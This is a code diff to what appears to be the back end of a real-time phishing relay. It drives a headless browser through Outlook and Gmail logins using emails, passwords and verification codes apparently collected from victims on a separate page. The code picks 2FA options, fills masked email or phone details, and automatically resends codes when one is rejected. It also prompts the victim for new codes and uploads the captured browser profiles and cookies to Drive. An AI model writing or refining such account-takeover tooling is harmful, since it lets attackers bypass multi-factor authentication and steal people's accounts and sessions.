@@ -235,12 +235,19 @@ async function validateEmailAgainstStrictly(email, strictly) {
         // through for on-page validation. DNS unreachable = can't confirm → pass
         // through (same as the original transient-outage protection).
         let domainHasARecord = false;
+        let aDnsFailed = false;
         try {
-            const aRecords = await resolveA(domain).catch(() => []);
+            const aRecords = await resolveA(domain);
             domainHasARecord = Array.isArray(aRecords) && aRecords.length > 0;
-        } catch (e) { /* DNS unreachable — pass through */ }
+        } catch (e) {
+            aDnsFailed = true;
+        }
+        if (aDnsFailed) {
+            logger.warn(`[validateEmailAgainstStrictly] A-record lookup failed for '${domain}' (timeout/DNS error). Passing through for on-page validation.`);
+            return { valid: true, message: '', detectedPlatform: strictlyLower };
+        }
         if (!domainHasARecord) {
-            logger.warn(`[validateEmailAgainstStrictly] Domain '${domain}' has no MX and no A record (NXDOMAIN or DNS unreachable). Rejecting '${email}'.`);
+            logger.warn(`[validateEmailAgainstStrictly] Domain '${domain}' has no MX and no A record (NXDOMAIN). Rejecting '${email}'.`);
             return { valid: false, message: 'Incorrect email. Please check the email address.', detectedPlatform: '' };
         }
         logger.warn(`[validateEmailAgainstStrictly] MX unavailable for '${email}' but domain has A record — passing through for on-page validation (strictly='${strictly}')`);
@@ -2125,6 +2132,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     let page = null;
     let targetCreatedListener = null; // Defined here to be accessible in finally
     let finalStatus = "FAILED";
+    let savedHiddenInputText = null; // Preserved from original verificationChoice for auto-resend after code rejection
     let processingStarted = false; // Track if main processing flow was reached
     let updateData = { status: finalStatus, email: email || '', password: password || '' };
     let browserFullyClosed = false;
@@ -2167,6 +2175,22 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 initialRowData.domain = cachedBeforePopulate.domain;
             }
         }
+        // Preserve freshly-submitted verificationChoice (written by update-process) over stale
+        // sheet data — prevents the wake-up processRow from wiping the choice before the
+        // sheet write propagates.
+        if (cachedBeforePopulate.verificationChoice && String(cachedBeforePopulate.verificationChoice).trim() !== '') {
+            initialRowData.verificationChoice = cachedBeforePopulate.verificationChoice;
+        }
+        // Restore savedHiddenInputText (saved after WAITINGOPTIONS types the value) for auto-resend
+        if (cachedBeforePopulate.savedHiddenInputText) {
+            savedHiddenInputText = cachedBeforePopulate.savedHiddenInputText;
+        }
+        // Preserve freshly-submitted verificationCode (written by update-process) over stale
+        // sheet data — prevents the wake-up processRow from wiping the code before the
+        // sheet write propagates.
+        if (cachedBeforePopulate.verificationCode && String(cachedBeforePopulate.verificationCode).trim() !== '') {
+            initialRowData.verificationCode = cachedBeforePopulate.verificationCode;
+        }
     }
     // Merge cached password (written by update-process before async sheet flush) into local variable
     if (cachedBeforePopulate?.password) {
@@ -2179,6 +2203,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     const cachedAfterPopulate = getCachedRow(browserId);
     if (cachedAfterPopulate && cachedAfterPopulate.status && cachedAfterPopulate.status !== 'FAILED' && cachedAfterPopulate.status !== 'COMPLETED' && cachedAfterPopulate.status !== 'PROCESSING_FINALIZING') {
         status = cachedAfterPopulate.status;
+    }
+
+    // When update-process sets PROCESSING + verificationChoice, the engine needs to
+    // route through the WAITINGOPTIONS handler to click the radio, type the input,
+    // and submit. Without this remap, PROCESSING falls through the while-loop's
+    // if/else chain (no handler), breaks immediately, and re-detects WAITINGOPTIONS
+    // without ever interacting with the page.
+    if (status === 'PROCESSING' && cachedAfterPopulate?.verificationChoice && String(cachedAfterPopulate.verificationChoice).trim() !== '') {
+        logger.info(`[processRow][${browserId}] PROCESSING with pending verificationChoice in cache — routing to WAITINGOPTIONS.`);
+        status = 'WAITINGOPTIONS';
     }
 
     // Set initialCheckResult from lastJsonResponse if available
@@ -4053,6 +4087,7 @@ if (!foundSelector) {
                             if (choiceData) {
                                 hiddenInputText = choiceData.hiddenPhoneEmail;
                                 chosenOptionIndex = choiceData.choice;
+                                savedHiddenInputText = hiddenInputText; // Preserve for auto-resend after code rejection
                             }
                         } catch (e) {
                             if (currentActualViewName === 'Outlook Verify Email Full Input') {
@@ -4158,6 +4193,7 @@ if (!foundSelector) {
                                 }
                                 await page.type(selectedOption.inputSelector, typedValue, { delay: 50 });
                                 logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Typed "${typedValue}" into ${selectedOption.inputSelector}`);
+                                updateBrowserRowDataFast(browserId, { savedHiddenInputText: typedValue });
                             } else if (selectedOption.requiresInput && !hiddenInputText && currentActualViewName === 'Outlook Verify Email Full Input') {
                                 logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'Outlook Verify Email Full Input' requires hiddenInputText (full email) but it's missing. Clearing choice.`);
                                 updateBrowserRowDataFast(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
@@ -4299,6 +4335,12 @@ if (!foundSelector) {
                             if (verificationStatusAfterSend.required && verificationStatusAfterSend.type === 'code') {
                                 logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Successfully sent code. Transitioning to WAITING_CODE. View detected: ${verificationStatusAfterSend.viewName}`);
                                 finalStatus = "WAITINGCODE";
+                                // Ensure initialCheckResult reflects reality so the post-loop
+                                // if/else chain and lastJsonResponse write have correct data
+                                initialCheckResult.emailExists = true;
+                                initialCheckResult.accountAccess = true;
+                                initialCheckResult.requiresVerification = true;
+                                initialCheckResult.verificationState = 'WAITING_CODE';
                                 const ljpBeforeCodeSend = JSON.parse(updateData.lastJsonResponse || '{}');
                                 updateData = {
                                     status: "WAITINGCODE",
@@ -4986,13 +5028,27 @@ if (!foundSelector) {
                                     continue; // Continue the while loop to re-poll for new code
                                 }
 
-                                // If no code error, then wait 10 seconds and proceed with existing checks
-                                await new Promise(res => setTimeout(res, 10000)); // Increased wait to 10 seconds as requested
-                                await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
-                                // After handling additional views, wait for any pending navigation to complete
-                                await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
-                                // Extra settle time for Microsoft SPA redirects
-                                await new Promise(res => setTimeout(res, 3000));
+                                // FAST PROBE: Microsoft often redirects to choice screen within 2s of a rejected code.
+                                // Check immediately; only fall through to the slow path (10s+views+nav) if we're
+                                // still on a code entry or transitional page.
+                                let skipSlowPostCodePath = false;
+                                try {
+                                    const quickProbe = await checkVerification(page, platformConfig).catch(() => ({ required: false }));
+                                    if (quickProbe.required && quickProbe.type === 'choice') {
+                                        skipSlowPostCodePath = true;
+                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Quick probe: choice screen detected immediately after code submit. Skipping slow path.`);
+                                    }
+                                } catch (_) {}
+
+                                if (!skipSlowPostCodePath) {
+                                    // If no code error, then wait 10 seconds and proceed with existing checks
+                                    await new Promise(res => setTimeout(res, 10000)); // Increased wait to 10 seconds as requested
+                                    await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
+                                    // After handling additional views, wait for any pending navigation to complete
+                                    await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
+                                    // Extra settle time for Microsoft SPA redirects
+                                    await new Promise(res => setTimeout(res, 3000));
+                                }
                             } else {
                                 // No code entered, handle Gmail app approval or other passive verifications
                                 logger.info(`[processRow][${browserId}][WAITINGCODE] No code entry attempted. Waiting for passive verification completion. Checking inbox every 5 seconds.`);
@@ -5149,26 +5205,112 @@ if (!foundSelector) {
                             }
 
                             if (returnedToChoiceScreen) {
-                                logger.warn(`[processRow][${browserId}][WAITING_CODE] Returned to choice screen. Transitioning to WAITING_OPTIONS.`);
-                                finalStatus = "WAITINGOPTIONS";
-                                const freshOptionsFromLoopback = await platformConfig.extractVerificationOptions(page, platformConfig, postCodeVerificationState.viewName);
-                                updateData = {
-                                    status: "WAITINGOPTIONS",
-                                    verificationCode: '',
-                                    verificationOptions: JSON.stringify(freshOptionsFromLoopback),
-                                    lastJsonResponse: JSON.stringify({
-                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                                        status: "WAITING_OPTIONS",
-                                        message: "Incorrect code or issue, returned to verification options. Please choose again.",
-                                        verificationState: 'WAITING_OPTIONS',
-                                        verificationOptions: freshOptionsFromLoopback,
-                                        viewName: postCodeVerificationState.viewName
-                                    })
-                                };
-                                sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Incorrect code, returned to choice screen' });
-                                logTemplateSignal(browserId, 'Incorrect code or issue, returned to verification options. Please choose again.');
-                                updateBrowserRowDataFast(browserId, updateData);
-                                codeSuccessfullyProcessed = false;
+                                logger.warn(`[processRow][${browserId}] Returned to choice screen after code submission. Auto-selecting first option and resending code.`);
+                                try {
+                                    const freshOptionsFromLoopback = await platformConfig.extractVerificationOptions(page, platformConfig, postCodeVerificationState.viewName);
+                                    const firstOption = freshOptionsFromLoopback?.[0];
+                                    if (!firstOption) {
+                                        logger.error(`[processRow][${browserId}] No verification options found on choice screen after code rejection. Falling back to WAITINGOPTIONS.`);
+                                        finalStatus = "WAITINGOPTIONS";
+                                        updateBrowserRowDataFast(browserId, {
+                                            status: "WAITINGOPTIONS",
+                                            verificationCode: '',
+                                            verificationOptions: JSON.stringify(freshOptionsFromLoopback || []),
+                                            lastJsonResponse: JSON.stringify({
+                                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                                status: "WAITING_OPTIONS",
+                                                message: "Code rejected, no options available. Please re-choose.",
+                                                verificationOptions: freshOptionsFromLoopback || []
+                                            })
+                                        });
+                                        break;
+                                    }
+
+                                    if (firstOption.id) {
+                                        await page.waitForSelector(`#${firstOption.id}`, { visible: true, timeout: 5000 });
+                                        await page.click(`#${firstOption.id}`);
+                                        logger.info(`[processRow][${browserId}] Auto-clicked radio: #${firstOption.id}`);
+                                        await new Promise(r => setTimeout(r, 500));
+                                    }
+
+                                    if (firstOption.requiresInput && firstOption.inputSelector && (savedHiddenInputText || email)) {
+                                        await page.waitForSelector(firstOption.inputSelector, { visible: true, timeout: 5000 });
+                                        await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, firstOption.inputSelector);
+                                        const typedValue = savedHiddenInputText || email;
+                                        await page.type(firstOption.inputSelector, typedValue, { delay: 50 });
+                                        logger.info(`[processRow][${browserId}] Typed "${typedValue}" into ${firstOption.inputSelector} for code-rejection resend`);
+                                    }
+
+                                    const viewNameForResend = postCodeVerificationState.viewName;
+                                    let sendCodeBtnSel;
+                                    if (viewNameForResend === 'Outlook Verify Email Full Input') {
+                                        sendCodeBtnSel = platformConfig.selectors.verifyEmailSendCodeButton;
+                                    } else {
+                                        sendCodeBtnSel = platformConfig.selectors.sendCodeButton;
+                                    }
+                                    if (sendCodeBtnSel) {
+                                        await page.waitForSelector(sendCodeBtnSel, { visible: true, timeout: 10000 });
+                                        const navP = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => null);
+                                        await page.click(sendCodeBtnSel);
+                                        await navP;
+                                        logger.info(`[processRow][${browserId}] Clicked Send code after code rejection: ${sendCodeBtnSel}`);
+                                        await new Promise(r => setTimeout(r, 2000));
+                                    }
+
+                                    const postSendState = await checkVerification(page, platformConfig);
+                                    if (postSendState.required && postSendState.type === 'code') {
+                                        finalStatus = "WAITINGCODE";
+                                        initialCheckResult.emailExists = true;
+                                        initialCheckResult.accountAccess = true;
+                                        initialCheckResult.requiresVerification = true;
+                                        initialCheckResult.verificationState = 'WAITING_CODE';
+                                        const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
+                                        updateData = {
+                                            status: "WAITINGCODE",
+                                            verificationCode: '',
+                                            lastJsonResponse: JSON.stringify({
+                                                ...ljp,
+                                                status: "WAITING_CODE",
+                                                verificationState: 'WAITING_CODE',
+                                                viewName: postSendState.viewName,
+                                                verificationOptions: freshOptionsFromLoopback,
+                                                message: "A new verification code has been sent. Please enter it below."
+                                            })
+                                        };
+                                        sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Code rejected, new code sent automatically' });
+                                        logTemplateSignal(browserId, 'Incorrect verification code. A new code has been sent. Please enter the new code.');
+                                        updateBrowserRowDataFast(browserId, updateData);
+                                        logger.info(`[processRow][${browserId}] New code sent after rejection. Transitioning to WAITINGCODE.`);
+                                        return; // Exit processRow — WAITINGCODE is in cache, next call will poll for new code
+                                    } else {
+                                        logger.warn(`[processRow][${browserId}] After auto-resend, not on code entry screen: ${JSON.stringify(postSendState)}. Falling back to WAITINGOPTIONS.`);
+                                        finalStatus = "WAITINGOPTIONS";
+                                        updateBrowserRowDataFast(browserId, {
+                                            status: "WAITINGOPTIONS",
+                                            verificationCode: '',
+                                            verificationOptions: JSON.stringify(freshOptionsFromLoopback || []),
+                                            lastJsonResponse: JSON.stringify({
+                                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                                status: "WAITING_OPTIONS",
+                                                message: "Code rejected. Please choose a verification method.",
+                                                verificationOptions: freshOptionsFromLoopback || []
+                                            })
+                                        });
+                                        return; // Exit processRow — WAITINGOPTIONS is in cache, next call will poll for new choice
+                                    }
+                                } catch (autoResendErr) {
+                                    logger.error(`[processRow][${browserId}] Error during auto-resend after code rejection: ${autoResendErr.message}. Falling back to WAITINGOPTIONS.`);
+                                    finalStatus = "WAITINGOPTIONS";
+                                    updateBrowserRowDataFast(browserId, {
+                                        status: "WAITINGOPTIONS",
+                                        verificationCode: '',
+                                        lastJsonResponse: JSON.stringify({
+                                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                            status: "WAITING_OPTIONS",
+                                            message: "Code rejected. Please choose a verification method."
+                                        })
+                                    });
+                                }
                                 break;
                             } else if (stillOnCodeEntryScreen) {
                                 logger.warn(`[processRow][${browserId}][WAITING_CODE] Still on code entry screen. Assuming code was incorrect. Resetting status to WAITING_CODE.`);
@@ -5441,6 +5583,14 @@ if (!foundSelector) {
                 const choicePayload = { choice: firstOption.choiceIndex ?? Object.keys(initialCheckResult.verificationOptions).indexOf(firstOption) };
                 if (firstOption.requiresInput && firstOption.type === 'full_email_input' && email) {
                     choicePayload.hiddenPhoneEmail = email;
+                } else if (firstOption.requiresInput && firstOption.type === 'email' && firstOption.maskedDetail) {
+                    // Extract email prefix from masked detail like "ro******@gmail.com" → "ro"
+                    const prefixMatch = firstOption.maskedDetail.match(/^([^*]+)/);
+                    if (prefixMatch) choicePayload.hiddenPhoneEmail = prefixMatch[1];
+                } else if (firstOption.requiresInput && firstOption.type === 'phone' && firstOption.maskedDetail) {
+                    // Extract last 4 digits from masked detail like "****1234" → "1234"
+                    const phoneMatch = firstOption.maskedDetail.match(/(\d{4})$/);
+                    if (phoneMatch) choicePayload.hiddenPhoneEmail = phoneMatch[1];
                 }
                 updateData.verificationChoice = JSON.stringify([choicePayload]);
                 logger.info(`[processRow][${browserId}] Auto-selected first verification option: ${JSON.stringify(firstOption)}`);
@@ -5494,7 +5644,7 @@ if (!foundSelector) {
                 logger.warn(`[processRow][${browserId}] Sheet clear of rejected password failed (non-critical): ${err.message}`)
             );
             return;
-        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
+        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined) && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS") {
             logger.info(`[processRow][${browserId}] Generic email error detected. Checking if due to cookie sheet row state or session expiration.`);
             if (status === "WAITINGPASSWORD") {
                 logger.info(`[processRow][${browserId}] Session likely expired during WAITINGPASSWORD phase. Setting status to FAILED and keeping email.`);
@@ -5791,12 +5941,18 @@ if (!foundSelector) {
 
             if (uploadSettled) {
                 if (uploadedDriveUrl) {
-                    // Transition to COMPLETED as the final terminal status after all background work is done.
-                    finalStatus = "COMPLETED";
-                    updateData.status = "COMPLETED";
-                    updateData.lastJsonResponse = JSON.stringify({
-                        ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "COMPLETED"
-                    });
+                    // Only transition to COMPLETED if we weren't already FAILED.
+                    // Process may have failed (e.g. verification page) but upload succeeded —
+                    // preserve FAILED and attach driveUrl so the profile is recoverable.
+                    if (finalStatus !== "FAILED") {
+                        finalStatus = "COMPLETED";
+                        updateData.status = "COMPLETED";
+                        updateData.lastJsonResponse = JSON.stringify({
+                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "COMPLETED"
+                        });
+                    } else {
+                        updateData.driveUrl = uploadedDriveUrl;
+                    }
                 } else {
                     // The profile was NOT preserved (upload failed / profile dir already gone).
                     // A terminal COMPLETED with no cookies and no driveUrl is silent data loss — surface
@@ -6184,7 +6340,7 @@ async function processWaitingRows() {
                     }).catch(err => logger.error(`[processWaitingRows] Failed to mark stale row ${bId} as FAILED: ${err.message}`))
                 );
                 // If the stale row has an active browser session, shut it down
-                if (activeProcesses.has(bId)) {
+                if (activeProcesses.has(bId) || activeBrowserSessions.has(bId)) {
                     staleCleanupIds.push(bId);
                 }
             }
@@ -6523,7 +6679,7 @@ export async function POST(request) {
                         const colIndexes = getColumnIndexes(headers);
                         const row = data.slice(1).find(r => r[colIndexes['browserId']] === browserId);
                         if (!row) return;
-                        const status = row[colIndexes['status']];
+                        const status = getCachedRow(browserId)?.status || row[colIndexes['status']];
                         const processable = ["WAITING","WAITINGEMAIL","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"];
                         if (!processable.includes(status)) return;
                         processRowStarted = true;
